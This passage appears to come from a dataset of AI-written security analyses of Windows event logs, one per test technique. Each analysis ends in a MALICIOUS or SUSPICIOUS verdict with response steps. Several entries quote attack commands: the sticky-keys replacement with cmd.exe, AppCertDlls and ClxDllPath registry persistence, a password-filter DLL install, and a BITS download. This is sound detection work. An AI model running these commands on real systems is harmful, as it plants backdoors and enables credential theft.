4. **Multiple Use of System Utilities:**
   - **Sysmon Events:** Frequent usage of `wevtutil.exe` and `conhost.exe` in a short time span by the `admin_test` user could point to potential log manipulation or information gathering, although the specific commands executed are not detailed in the logs.

5. **Time Change Event:**
   - **Security EventID 4616 and System EventID 1:** These show a minor system time discrepancy adjustment. Such behavior isn't typically linked to malicious activity on its own but in conjunction may indicate attempts to manipulate time-sensitive logs.

### Assessment:

The logs include activities that align with potentially malicious actions, such as unauthorized user creation, high privilege assignments, and command-line usage to interact with system utilities. The account `admin_test` executed actions that raise red flags, such as creating a new user account and leveraging high-level privileges.

### Conclusion: SUSPICIOUS

The collection of events in the logs suggests suspicious activity that requires further investigation. The creation of a user account through direct command execution and the assignment of elevated privileges are actions that warrant deeper analysis to confirm whether they were authorized and necessary.

### Recommended Actions:

1. **Verify User Intent and Authorization:**
   - Confirm whether the `data.001_CMD` user account creation was intended and necessary for business purposes. Investigate the `admin_test` user’s activities to determine if they align with their role.

2. **Conduct a Security Audit:**
   - Review system access controls and ensure that only necessary privileges are granted. Audit administrative actions to ensure compliance with security policies.

3. **Enhanced Monitoring:**
   - Implement real-time monitoring and alerting for similar activities. Future occurrences of user creation, privilege adjustments, and command execution via `cmd.exe` should trigger alerts.

4. **Review System Integrity:**
   - Check for potential unauthorized modifications to system files or configurations. This involves validating hashes of critical system binaries and reviewing recent changes.

5. **Investigate Network Connections:**
   - Examine any unusual network activity from the IP address logged during the login events to ascertain if there are any unauthorized outbound communications.

By proceeding with these steps, the origin and legitimacy of these actions can be further clarified to protect the organization's IT infrastructure."
Replace binary of sticky keys,"### Detailed Analysis of Logs:

**1. Analysis of Sysmon Log Events:**

- **Process Executions:**
  - The execution of `whoami.exe` and `hostname.exe` are generally benign, used for querying user and system information. These processes are executed by a user with high integrity level (`admin_test`), which doesn't raise immediate suspicion.
  - The `cmd.exe` command associated with modifying `sethc.exe` is noteworthy. This command line indicates an attempt to replace the Sticky Keys executable (`sethc.exe`) with `cmd.exe`, which is a known technique for privilege escalation. This activity suggests a potential security breach since it grants command shell access with system privileges at the login screen.

- **Usage of `wevtutil.exe`:**
  - The execution of `wevtutil.exe` in such rapid succession (numerous instances logged) could indicate attempts to manage (likely clear) event logs, possibly to cover tracks, although `wevtutil.exe` can also perform legitimate tasks.

- **Microsoft Edge Update Activity:**
  - Several entries pertain to Microsoft Edge updates, which align with typical software update processes for maintaining browser security and functionality. These logs appear normal and consistent with legitimate update activities.

**2. Command Analysis:**
- The command altering `sethc.exe` raises a red flag. This pattern (`IF NOT EXIST ... copy /Y cmd.exe sethc.exe`) is typically used to facilitate unauthorized access with elevated permissions.

**3. Summary of System, Application, and Security Logs:**
- **System Log:**
  - Reflects a legitimate Microsoft Defender Antivirus update, which aligns with standard system security practices.
- **Application Log:**
  - Contains entries indicating that the Edge update services stopped, which can be a normal part of update processes or services restarting.
- **Security and PowerShell Logs:**
  - Information provided lacks notable entries indicating clear malicious activities or executions.

### Conclusion and Resolution:

- **Identified Threats and Risks:**
  - **Malicious Activity:** The command invocations attempting to swap `sethc.exe` with `cmd.exe` are a definitive indicator of an attempted compromise. This potential malicious activity seeks to exploit user login features for unauthorized administrative access.

- **Guidance on How to Proceed:**
  - Immediate measures are required to investigate and ensure that the integrity and security of the system are maintained. This includes:
    - Inspecting the current state of `sethc.exe` and ensuring it hasn’t been replaced.
    - Reviewing access logs to trace unauthorized or anomalous user activity.
    - Conducting a thorough scan for any other unauthorized changes or malware.
    - Implementing or enhancing monitoring to detect similar attempts in the future.

### Final Resolution:
- **Resolution:** MALICIOUS – The logs indicate clear signs of a privilege escalation attempt through unauthorized replacement of the `sethc.exe`, requiring immediate attention to contain and remediate the breach."
Code Executed Via Excel Add-in File (XLL),"Upon conducting a thorough analysis of the provided logs, several indicators of potentially suspicious activity were identified, which warrant further investigation:

1. **Repeated Process Execution by 'admin_test'**: The Sysmon log indicates the repeated execution of processes under the user `SERVER002\admin_test`, such as `powershell.exe`, `wevtutil.exe`, and `conhost.exe`, which are often used in system administration and potentially malicious activities. Furthermore, `powershell.exe` was initiated with a potentially suspicious command executing scripts from a temporary directory indicating possible unauthorized or subversive activities. Powershell, especially with scripts from a temp folder, often is associated with malware or exploitation activities.

2. **PowerShell Activity**: The PowerShell logs show a script that interacts with Excel via COM objects. This type of scripting can be legitimate but, if not accounted for by IT or specific administrative tasks, would be seen as a red flag for malware activity, specifically, macros or exploits leveraging Excel. This is because attackers often use PowerShell scripts to execute payloads within Office applications.

3. **High Privilege Access Logon**: The Security logs contain multiple logon events (`Event ID 4624`) using `LogonType 5`, which is indicative of a service logon. While these can be legitimate, the context of other suspicious activities calls for verifying if these are expected actions by the authorized users or processes.

4. **Privilege Use**: The `Event ID 4672` logged privileges associated with high-level administrative actions, such as `SeDebugPrivilege`, given to the `SYSTEM` account. This is generally legitimate but should be monitored if correlated with other suspicious activities here.

5. **Abnormal Credential Access Attempts**: Security logs show an `Event ID 5379` indicating repeated failed credential access attempts by machine accounts. Although the credentials returned were zero (failed attempts), these activities must be verified for potential lateral movement attempts or credential theft efforts.

Based on these logs, the resolution is:

### SUSPICIOUS

The noted behaviors, especially the use of PowerShell and the high-frequency process execution by `admin_test`, imply potentially unauthorized or suspicious activity. However, without further corroborating evidence or context, such as cross-referencing with organizational baselines, it cannot be conclusively determined as malicious.

### Guidance:
- Conduct a review of user `admin_test` and confirm their permissions and expected actions.
- Investigate the PowerShell script origins and intention to ensure they align with authorized operations.
- Correlate these activities with endpoint detection systems (such as anti-virus logs) and network logs to verify if there is any further attempted data exfiltration or command and control communication.
- Consider placing additional controls or monitoring on `powershell.exe` and specific scripts executed from temporary directories.
- Review and validate high privilege and service logon events to rule out unauthorized configurations or exploitation."
Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"After analyzing the provided Windows event logs, I have identified several items of interest that may indicate malicious activity:

1. **PowerShell Activity with Suspicious Intentions**:
   - The Sysmon and PowerShell logs indicate execution of commands via `powershell.exe` that modify registry settings related to Microsoft Office Word's VBA project security (`AccessVBOM`). This behavior is indicative of an attempt to manipulate macros, which is a known technique used in various malware attacks to gain persistence or execute further payloads.
   - A particularly concerning aspect is the PowerShell script's aim to insert VBA code, which creates a scheduled task to execute `calc.exe` at a specific time. While opening a calculator seems benign, the ability to execute any arbitrary application signifies potential for harmful actions.

2. **Usage of `wevtutil.exe`**:
   - The logs also show multiple invocations of `wevtutil.exe`, a command-line utility used to manage Windows event logs. While legitimate administrators might use it for log management, it is also used by attackers to delete or clear event logs to cover their tracks.

3. **Frequent Invocation of `conhost.exe`**:
   - Repeated execution of `conhost.exe`, often associated with command-line or console tasks, can be benign but is worth noting, especially in conjunction with other suspicious activities.

4. **Scheduled Tasks via VBA Macros in Word**:
   - The PowerShell command aims to inject a VBA macro in Word's template, which auto-executes upon certain triggers or conditions. The creation of a scheduled task as part of this macro is an indicator that the intention could be to persist or schedule tasks of more nefarious nature.

5. **General PowerShell Usage**:
   - The extensive use of PowerShell with elevated privileges (`IntegrityLevel: High`) by the user (`SERVER002\\admin_test`) raises alarms about potentially unauthorized activities.

Taking all these points into consideration, the activities observed suggest a high likelihood of malicious intent, especially given the manipulation of registry settings, VBA macro injection, and usage of potentially system-altering scripts via PowerShell, which are classic indicators of compromise.

**Resolution: MALICIOUS**

**Guidance**:
- Isolate the machine to prevent further spread or execution of any harmful activities.
- Conduct a full investigation to determine if the scripts have executed fully and whether any additional malware or persistence mechanisms have been deployed.
- Analyze and clean any impacted systems, especially focusing on removing unauthorized scheduled tasks and macros.
- Review and monitor logging and alerting, ensuring that all security measures are active and no logs have been cleared or tampered with.
- Educate users on recognizing and reporting unusual system behavior, particularly involving unexpected PowerShell activity."
Simulate Patching termsrv.dll,"Upon reviewing the provided logs, a few entries indicate potentially malicious activity:

1. **PowerShell Execution with Malicious Commands**:
   - The PowerShell logs clearly show the execution of a script designed to manipulate the security settings of a critical system file (`termsrv.dll`) and back up and restore it with modifications, which indicates an attempt to bypass or alter security measures in place. 
   - This script specifically attempts to modify access control permissions to grant full control to administrators, create backups, and perhaps insert or replace content in `termsrv.dll`, a component associated with Remote Desktop Services, indicating a suspicious attempt at privilege escalation or persistence mechanism.

2. **Event Logs and Activity Analysis**:
   - The Sysmon logs show several high-integrity level processes running under the `SERVER002\\admin_test` user, such as `whoami.exe`, `hostname.exe`, and `conhost.exe`, which are generally benign but could be used for reconnaissance or masking malicious activity if executed in a peculiar context.
   - The use of `wevtutil.exe`, a tool for managing Windows event logs, is noted multiple times by the same user. Frequent spawning of this process in concurrence with the `conhost.exe` may indicate log tampering attempts.

3. **Security Log Entries**:
   - Event ID 4672 indicates that the user `admin_test` had advanced privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others that are typically needed for system-level changes, supporting the context of potential malicious actions seen in the PowerShell logs.

4. **Time Discrepancy**:
   - The Security log entries under Event ID 4616 indicate anomalous time changes where the system clock was adjusted. This can be indicative of tampering or efforts to hide the activity timeframes.

Based on the evidence, especially around the PowerShell execution and subsequent system modifications, these logs contain signs of **MALICIOUS** activity. 

**Resolution**: 

- **MALICIOUS**: The command history and log alterations suggest unauthorized attempts to manipulate system configurations potentially to bypass security mechanisms and maintain persistent access. Immediate actions should be taken to isolate Server002 from the network, conduct a full security assessment and forensic analysis, identify and neutralize any active threats, and review access management procedures for any anomalies or potential breaches."
Install and Register Password Filter DLL,"Upon analyzing the provided logs, several factors suggest a strong potential for malicious activity on the system, particularly concerning the PowerShell and Sysmon logs. Here is a detailed assessment:

### 1. **PowerShell Log Analysis:**
- **Malicious PowerShell Activity:** The PowerShell log entries reveal activity involving modification of registry settings under the Lsa key, specifically the ""Notification Packages,"" which is a common technique used by attackers for persistence or credential theft.
- **Command Execution and DLL Modification:** The command executed is `powershell.exe & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\lsa_backup.reg"" ...}`, which indicates a backup of the LSA registry followed by the copying of a suspicious DLL (`filePWFilter.dll`) into the `System32` directory and registry modification, implying potential credential theft or backdoor installation.

### 2. **Sysmon Log Analysis:**
- **Suspicious Process Execution:** Numerous `wevtutil`, `PowerShell`, and `reg.exe` executions indicate manipulation of event logs and registry keys, an action often done by malicious actors to cover tracks or for persistence.
- **Unauthorized Image Execution:** Execution of `reg.exe` with administrative privileges (High Integrity Level) originating from a user session is highly concerning and indicates possible illegitimate operations.
- **Anomalous User Activity:** Frequent appearances of the `admin_test` account running high-privileged processes point to potential compromise or misuse by unauthorized actors.

### 3. **Application and Security Log Observations:**
- **Service Interruptions:** Repeated service stops associated with `edgeupdate` services without typical system reboot sequence could indicate tampering.
- **Elevated Privileges Event:** Multiple events indicating privileges typically associated with sensitive system operations such as `SeDebugPrivilege` and other system-level privileges granted to `SYSTEM` processes, matching the timing of PowerShell activity, suggest privilege escalation attempts.

### Recommendation:
Given the nature and context of the observed activities—manipulating sensitive registry paths, stopping essential services, and possibly altering event logs—these activities are consistent with known malicious behaviors such as persistence mechanism installation, log tampering, and credential theft strategies.

**Conclusion:** 
The provided logs exhibit strong indicators of a compromised system environment due to unauthorized activities involving registry, file system, and process manipulation with possible persistence mechanisms and credential theft strategies at play. This situation warrants immediate security intervention.

**Resolution:** MALICIOUS

**Next Steps:**
1. **Immediate Containment and Investigation:**
   - Isolate the affected system from the network.
   - Conduct a thorough forensic analysis to identify the entry point and scope.
2. **Credential Revocation:**
   - Reset credentials and evaluate the use of compromised accounts.
3. **Review and Harden Security Policies:**
   - Review Group Policies for registry and PowerShell execution policies.
   - Establish enhanced monitoring of critical system activities.
4. **System Remediation:**
   - Clean the system of any potential backdoors or malware identified.
   - Rebuild the system if necessary to ensure integrity.

5. **Incident Report Compilation:**
   - Compile a full incident report for internal review and future prevention measures."
Application Shim Installation,"After analyzing the provided Windows event logs, the following observations and assessments are made:

### Observations:
1. **Sysmon Logs:**
   - Multiple executions of system utilities are observed such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`.
   - The `cmd.exe` process executed a command (`sdbinst.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\fileShimx86.sdb""`), which seems to be installing an application compatibility database. The execution of `sdbinst.exe` in this context can be a red flag because this utility can be used to alter system configurations, though it can also be part of legitimate operations.
   - Several activities related to ""Microsoft Edge Update"" processes and services running as ""NT AUTHORITY\SYSTEM"" are observed which might be typical for updating Microsoft Edge or its components.

2. **Application Logs:**
   - The application log entries are mainly related to `edgeupdate` services starting and stopping, which aligns with the system update operations seen in the Sysmon logs.

3. **Security and System Logs:**
   - These logs were not included or did not contain any entries. Lack of records here reduces visibility into login events, privilege escalation, or detailed system changes.

### Assessment:
- **Powershell Execution:**
  The initial execution of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` could be benign or part of standard administrative tasks, but it's noteworthy when coupled with `wevtutil.exe`, which interacts with event logs, potentially for clearing or exporting them.

- **Sdbinst Utilization:**
  The use of `sdbinst.exe` is notable as it is often used for altering the system's application compatibility databases - this can be used for legitimate configuration or deployment procedures, but its use in non-standard directories can be suspicious.

- **High Privilege Execution:**
  Many processes ran under the ""High"" integrity level, which is expected for some administrative operations, but consistent high-level operations might need investigating, especially if unauthorized.

- **Microsoft Edge Update:**
  The logs indicate multiple update operations involving Microsoft Edge, all running under `NT AUTHORITY\SYSTEM`. These actions are typically legit for updating tasks part of regular maintenance unless otherwise indicated by additional irregular system behaviors or unauthorized changes.

### Conclusion:
- Based on the current logs, the activity suggests a combination of legitimate system administration tasks and some potentially suspicious activities (notably with `sdbinst.exe`). However, without more corroborative data indicating misuse or unauthorized access, a definitive malicious compromise cannot be determined from these logs alone.

### Resolution:
- **SUSPICIOUS** - The logs contain certain elements that warrant closer scrutiny. The usage of `sdbinst.exe` and concurrent use of `wevtutil.exe` could imply malicious intent, or simply reflect system maintenance or application deployments. Further investigation is needed to understand the context, including:
  - Checking for recent changes in system configurations or unusual file modifications linked to `sdbinst.exe`.
  - Verification of the legitimacy and authenticity of the processes executed, especially those executing with high integrity levels.
  - Ensuring that `edgeupdate` activities align with expected software updates and not unexpected changes.

Logging and monitoring should continue focusing on access logs, any unusual spike in activities, and reviewing any additional context for the suspicious actions noted."
WMI Invoke-CimMethod Start Process,"### Analysis

1. **Time Change Events (EventID 4616 and 1 in Security and System logs):**
   - The time on the system was adjusted from a future time (""2024-10-27 13:12:55.2298304"" to ""2024-10-27 13:12:47.3626953""). This event can be indicative of manual alteration of system time, which could be used to manipulate the logs' timestamps or to bypass scheduled tasks/security mechanisms. This warrants further investigation to determine if it was an authorized action.

2. **Logon and Privilege Events (EventID 4624, 4634, 4672 in Security logs):**
   - The user ""admin_test"" logs in with NTLM authentication and is granted high privileges including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others, which are typically necessary for administrative tasks. The use of NTLM from a workstation (DESKTOP-3HL5B2P) for an Admin account is somewhat normal, but privilege escalation through these privileges requires scrutiny.
   
3. **Sysmon Process Events (Sysmon logs):**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by ""admin_test"" were recorded. While `wevtutil.exe` might be used for log management tasks, frequent execution could indicate log manipulation/clearing attempts.
   - Execution of potentially benign processes like `hostname.exe` and `whoami.exe` observed. `HOSTNAME.EXE` was executed from a high-integrity level, which isn't inherently suspicious if it's part of expected admin activity but should be corroborated with user behavior.
   - A notable PowerShell execution was logged with commands that indicate the use of PowerShell to start `calc.exe` on the local system. While starting `calc.exe` is not malicious, the manner in which PowerShell is used suggests the script could be a test or a demonstration of the script capability using PowerShell's `Invoke-CimMethod`.

4. **PowerShell Log Events (PowerShell logs):**
   - Detailed PowerShell command execution, including credential creation with password in plain text for local execution. This scripting method could potentially be malicious if used for unauthorized access or changes to other systems.

### Assessment

The logs reveal several activities that are suspicious:
- The alteration of system time, if unauthorized, is suspicious and could indicate an attempt to hide or manipulate event logs.
- The use of PowerShell with scripting to execute remote commands, even benign as starting `calc.exe`, demonstrates potential capability exploration.
- Multiple executions of `wevtutil.exe` suggest possible attempts to view or clear logs by the same user who has escalated privileges.

### Resolution

- **SUSPICIOUS:** Given the findings, the activities are suspicious and warrant further investigation. The time change, extensive privilege use, and scripting with PowerShell raise red flags about potential misuse. A deeper investigation into the user’s intent, validation of credential use, and any external connections made from this host should be conducted to confirm whether these activities were legitimate administrative tasks or indicative of malicious behavior."
Create registry persistence via AppCert DLL,"### Analysis of the Logs

Based on the provided Sysmon, PowerShell, and associated logs, here are the key findings indicating potential malicious activity:

1. **PowerShell Script Execution:**
   - The logs contain instances of Windows PowerShell being executed with a specific script: 
     ```
     powershell.exe & {Copy-Item \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.009\\bin\\fileTest.dll\"" C:\\Users\\Public\\fileTest.dll -Force, reg add \""HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"" /v \""fileTest\"" /t REG_EXPAND_SZ /d \""C:\\Users\\Public\\fileTest.dll\"" /f, if($false){Restart-Computer}}
     ```
   - This command attempts to copy a DLL to a public directory and makes a registry modification to the AppCertDlls key, which can indicate an attempt to load a malicious DLL into processes.

2. **Registry Modification:**
   - The command adds a registry value under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls`. This is a known persistence mechanism used by attackers to inject malicious DLLs into processes' address spaces.

3. **Process Execution Analysis:**
   - There are frequent occurrences of `wevtutil.exe` and `conhost.exe` processes, which are commonly used for legitimate purposes, but their repeated and clustered execution in a short time span is unusual.
   - The `whoami.exe` and `hostname.exe` were executed, which might be benign; however, when combined with other potentially malicious activity, it raises concerns.

4. **Context and Privileges:**
   - All suspicious activities are executed by the user `SERVER002\admin_test` with high integrity levels, indicating elevated privileges. This could be an indication of privilege escalation or the actions of an already compromised admin account.

5. **Lack of Security Logs:**
   - The absence of security logs like login events or explicit unauthorized access attempts could indicate that logs might have been tampered with or filtered, which is also a common tactic used by attackers.

### Assessment and Resolution

- **Indicators of Compromise (IoCs):**
  - Usage of PowerShell to modify critical registry keys.
  - Attempt to load DLLs through the AppCertDlls registry key.
  - Elevated usage of typical system utilities (`wevtutil`, `conhost`) in bulk.
  
- **Potential Threats:**
  - There are strong indicators of malicious behavior aimed at persistence and possible privilege escalation.
  - The use of a legitimate account with high privileges might point to compromised credentials.

### Recommendations and Conclusion

- **Immediate Actions:**
  - Conduct a thorough investigation on the `admin_test` account for unauthorized access and reset its credentials.
  - Inspect the DLL `fileTest.dll` for any signs of malware.
  - Review all recent registry changes and restore affected keys if confirmed malicious.

- **Further Investigations:**
  - Monitor for any additional unusual process executions or network communications.
  - Deploy enhanced monitoring on `Server002`.

Given the identified activities and indicators, the resolution is:

**MALICIOUS**

These logs clearly demonstrate behavior consistent with malicious activity, necessitating immediate containment and additional investigation to prevent further compromise."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"To analyze the provided logs for indicators of malicious activity or compromise, let's follow a structured assessment of each log type: System, Security, Windows PowerShell, Application, and Sysmon.

- The logs indicate the execution of various Microsoft Edge Update activities.
- Regular processes related to `hostname.exe`, `conhost.exe`, and benign utilities like `whoami.exe` are logged, which aren't inherently suspicious on their own.
- The correlation of events primarily describes typical background system tasks and application updates.

**Assessment:** BENIGN. Sysmon logs do not exhibit any abnormal or malicious behavior when correlated with expected system tasks.

---

### Final Assessment:

The notable finding from the logs is the WMI persistence method established via PowerShell, detected in the PowerShell event log. This indicates a deliberate attempt to maintain unauthorized access to the system, consistent with malicious behavior. While other logs appear normal, the PowerShell log distinctly suggests malicious activity.

**Resolution:** MALICIOUS

### Guidance on How to Proceed:
- **Containment and Eradication:**
  - Immediately isolate the affected system from the network to prevent further compromise or lateral movement.
  - Remove the identified malicious WMI event subscription and any other suspicious persistence mechanisms.
  - Conduct a thorough scan for additional indicators of compromise across the affected host.

- **Investigation and Recovery:**
  - Perform a detailed investigation to understand the entry point and the full scope of the compromise.
  - Confirm removal of the threat presence, and ensure no backdoors or secondary attack vectors remain.
  - Restore affected systems using backups made before the incident, if necessary.

- **Preventive Measures:**
  - Update security protocols and strengthen monitoring for suspicious PowerShell activity and WMI changes.
  - Educate staff on cybersecurity hygiene, including recognizing phishing attempts and unauthorized PowerShell usage.
  - Consider implementing stricter access controls and enhancing security logs monitoring for early detection of similar threats."
New shim database files created in the default shim database directory,"**Detailed Analysis of the Logs:**

### Findings in the PowerShell Log:
- The PowerShell logs show a consistent pattern of a command being executed that involves copying a specific file (`data.011CompatDatabase.sdb`) from a temporary directory to both `C:\Windows\apppatch\Custom\` and `C:\Windows\apppatch\Custom\Custom64\`. 
- The use of PowerShell to conduct file operations involving system directories (like `C:\Windows\apppatch\`) can sometimes point to malicious activity, especially when manipulating compatibility databases (`*.sdb` files can be used in shimming techniques to bypass security controls).
  
### Findings in the Sysmon Log:
- Multiple instances of typical system binaries (e.g., `whoami.exe`, `conhost.exe`) and services (e.g., `wevtutil.exe`, `hostname.exe`) are being executed by `SERVER002\admin_test`. The `wevtutil.exe` is capturing event logs into `TempLog.evtx`.
- The presence of `wevtutil.exe` usage to export logs is suspicious, as it might indicate log manipulation or exfiltration attempts.
- PowerShell is also seen executing the aforementioned command. The parent process of PowerShell and other suspicious utilities is `wsmprovhost.exe`, which can indicate remote PowerShell activity.

### Findings in the Application and Security Logs:
- The Application log contains routine logging information primarily from the `Software Protection Platform Service`. There's nothing suspicious in the Application log.
- The Security log information is not provided, so no findings can be derived from it.

### Overall Assessment:
The logs exhibit several indicators that could suggest malicious activity:

1. **PowerShell Command Execution:**
   - Copying a compatibility database file to a system patch directory is highly suspicious, given that such actions can be employed for persistence or privilege escalation by malicious actors.

2. **Sysmon Logs:**
   - The use of `wevtutil.exe` to process event logs (`epl`) is suspicious, as attackers often use this tool to clear or export logs to cover tracks.
   - Execution of PowerShell with a high integrity level suggests potential security configurations or protections being bypassed.

### Recommendation and Resolution:

- **Resolution: SUSPICIOUS**
   - The activities outlined, particularly the PowerShell script's intent and the usage of `wevtutil.exe`, warrant further in-depth investigation.
   - It is advised to monitor the machine in real-time for further anomalous activity, conduct a threat-hunting exercise around these indicators, and possibly isolate the host if malicious intent is further suspected.
   - Consider reviewing any configuration changes in the `apppatch` directories and any persistent artifact residing in the directories where logs and scripts are being manipulated.
   - Engage in a thorough inspection of related network traffic and user behaviors around the timestamps identified in the logs."
Load custom DLL on mstsc execution,"After analyzing the provided Windows event logs, here's a detailed assessment of the situation:

### Analysis:

1. **Time Synchronization Events:**
   - Events involving time synchronization (Event ID 4616 from Security Log and Event ID 1 from System Log) indicate adjustments to the system time by the ""LOCAL SERVICE"" user via `svchost.exe`. This is a normal event for maintaining correct system time using Network Time Protocol (NTP) and is typically a benign activity.

2. **Process Execution Events:**
   - Multiple Sysmon Event IDs 1 and 5 show processes like `hostname.exe`, `whoami.exe`, `cmd.exe`, `conhost.exe`, `reg.exe`, and `MicrosoftEdgeUpdate.exe` being run by the user `SERVER002\admin_test` with high integrity level.
   - Execution of `whoami.exe`, `hostname.exe`, or `wevtutil.exe` under normal circumstances and by administrative users for system configuration checks is usually benign unless coupled with other suspicious activity.
   - The execution of `cmd.exe` with a specific command-line argument to modify the Windows Registry using `reg.exe` is more intriguing. The command line:
     ```
     reg add ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f
     ```
     represents a registry modification. While this could be a legitimate administrative task, such registry changes can also be leveraged for persistence or evasion techniques.

3. **Edge Update Events:**
   - The majority of the log entries related to `MicrosoftEdgeUpdate.exe` seem typical for an update process. No anomalies indicate this process is performing actions outside expected update behavior.

### Assessment:

- **Suspicious Behavior:**
  - The registry modification using the `reg.exe` command through `cmd.exe` is suspicious. Registry changes can potentially indicate attempts to alter system behavior or establish persistence.
  - The presence of numerous `conhost.exe` processes spawned by both system and user-level applications warrants attention but is often benign unless paired with other malicious indicators.

### Conclusion:

The log entries contain regular system behavior mixed with one potentially suspicious registry modification operation. This alone is insufficient to definitely declare malicious activity without further supporting evidence from other areas like anomaly detection, user behavior analytics, or endpoint protection alerts.

**Resolution: SUSPICIOUS**

### Recommended Actions:

1. **Further Investigation:**
   - Review the intentions behind the registry changes by checking with the system administrators if such changes were intended.
   - Conduct a review of system changes and any scripts that might have triggered this command.

2. **Monitoring:**
   - Enable enhanced logging for activities involving `cmd.exe` and `reg.exe`.
   - Use endpoint detection tools to seek potential threats or verify this is part of a known legitimate script.
  
3. **User Education:**
   - Contact the user `admin_test` to verify the actions and monitor for unusual behavior or unauthorized access."
Bitsadmin Download (PowerShell),"Upon reviewing the provided Windows event logs, here is a detailed analysis of the events:

### Anomalous Behavior and Suspicious Indicators:
1. **PowerShell Activity**:
   - The PowerShell logs show the execution of a command that downloads a file from an external source (`https://raw.githubusercontent.com`) using `Start-BitsTransfer`. The command saves the file to a temporary directory (`$env:TEMP\\bitsadmin2_flag.ps1`). 
   - This behavior can be indicative of malicious activity, as it involves downloading potentially executable content from the internet using PowerShell. Such usage could be an attempt to deliver malware or scripts for further exploitation.

2. **Sysmon Logs**:
   - There is consistent evidence of process creation involving PowerShell and other system executables like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. While these processes are legitimate, their concurrent execution with PowerShell scripts that download and execute remote files heightens the level of suspicion.
   - The logs also document numerous processes affiliated with Microsoft Edge Update activities, which could be routine updates. However, their coinciding timestamp with potentially suspicious PowerShell activities should be noted for further correlation or investigation.

3. **Lack of Typical Security Logs**:
   - There is an absence of typical security audit logs (e.g., logins, privilege escalations) specifically listed. The absence could be symptomatic of log clearing or inadequate logging, which is concerning in the context of analyzing host security.

### Assessment:
- The presence of a PowerShell script downloading a potentially suspicious file and the lack of detailed security logs for typical user activities form a pattern that suggests potentially malicious behavior. The usage of `Start-BitsTransfer` and downloading from an external source without a clear business justification is often considered a red flag indicating possible compromise or intended misuse.

### Resolution:
Based on the analysis of the provided logs, the resolution is **SUSPICIOUS**. The observed activity could imply a benign or legitimate script execution, but due to the nature of downloading potentially unknown files from an external source via PowerShell, it warrants further investigation. 

### Recommendations:
- **Conduct a deeper investigation** into the PowerShell script being downloaded, verifying its source and examining its contents for any malicious intent.
- **Inspect the system for additional indicators of compromise**, such as unauthorized changes or additional suspicious files or scripts.
- **Ensure logging is configured comprehensively** across the system to capture all user activities and security-related events.
- **Review network logs or firewall settings** to determine if there was any unauthorized or unusual traffic correlating with the time of these events.
- **Perform a thorough security audit** on `Server002` to ensure that no further suspicious activities went unnoticed.

These measures will help ascertain the context and potential maliciousness of the activities observed."
Install AppInit Shim,"### Detailed Analysis:

1. **Security Log:**
   - **Event ID 4624 and 4672**: The combination of these events indicates successful logons and privilege assignments, typically associated with administrative or SYSTEM accounts. The repetition of these events, specifically with the user `SYSTEM` and privileges like `SeDebugPrivilege`, suggests SYSTEM-level activities, which are normal for service operations.
   - **Event ID 5379**: These events indicate credential manager operations which failed to read credentials (ReturnCode 3221226021 indicates STATUS_NO_SUCH_LOGON_SESSION), which suggests normal system service activity but shouldn't be frequent unless there is a misconfiguration with network access.
   - **Event ID 4798**: This event involves enumeration of accounts (like Administrator, admin_test, DefaultAccount, etc.) using taskhostw.exe, which is common in legitimate administrative tasks but should be cross-verified with operational logs to ensure it aligns with expected administrative activity.

2. **Sysmon Log:**
   - **Process Creations (Event ID 1)**: We see various system and service-related process creations, predominantly involving Microsoft Edge Update processes. These could indicate normal updates or scheduled tasks being executed by SYSTEM. The presence of registry modifications via `reg.exe` through PowerShell (by `admin_test`) could be regular administrative/scripted maintenance.
   - **Process Termination (Event ID 5)**: Frequent termination of `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE` shows command-line activities. The use of `PowerShell`, `wevtutil.exe` by `admin_test` could be indicative of manual forensics or system monitoring commands executed, which aren't typically persistent processes.
   
3. **PowerShell Log:**
   - Events involving `PowerShell` usage are logged in Sysmon indicating activities initiated by `admin_test`. No additional abnormal activities are logged directly in a separate PowerShell logging, indicating use of native PowerShell for potential diagnostics or system probing.

4. **Application Log:**
   - The logs show entries for `Microsoft Edge Update`, indicating service stopping events for Edge updates, which can be benign assuming regular update procedures.

### Assessment of the Situation:
- The logs portray a routine pattern of system maintenance and Windows service operations, such as EDGE updates, account enumeration, and registry changes which can be associated with legitimate administrative actions.
- However, the context of `PowerShell` and `reg.exe` usage could require deeper insight if this deviates from standard operational baselines for `admin_test`.

### Resolution:
**SUSPICIOUS**: While many entries can be categorized under routine system or administrative operations, the combination of registry modifications, PowerShell utilization, system-level logons, and credential read attempts particularly around a user context (`admin_test`), warrant further investigation. It is necessary to confirm these operations were conducted during authorized maintenance or by trusted sources.

### Guidance on How to Proceed:
- **Verify Authorizations**: Cross-verify any recent administrative tasks or scripts that expectedly align with the use of PowerShell and registry edits.
- **Audit User Activities**: Check the legitimacy of activities initiated by `admin_test`. Confirm if these actions align with scheduled maintenance or updates.
- **Configuration Review**: Investigate the credential reading events (Event ID 5379) to ensure no misconfigurations are leading to unnecessary network access attempts.
- **Security Monitoring**: Continue with stringent monitoring of `PowerShell` execution and privilege assignment to catch any malicious configurations early.
- **User Training**: Reinforce the company's security policies and training for admins to avoid any risky scripts or unsupervised registry changes."
Persistent Code Execution Via Excel Add-in File (XLL),"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - The logs indicate the execution of a PowerShell script that interacts with Microsoft Excel COM objects and modifies the registry. A script is executed using `powershell.exe`, which:
     - Determines if a 32-bit or 64-bit version of Office is installed.
     - Copies an Excel add-in (`excelxll_x64.xll` or `excelxll_x86.xll`) to the AddIns folder under `APPDATA`.
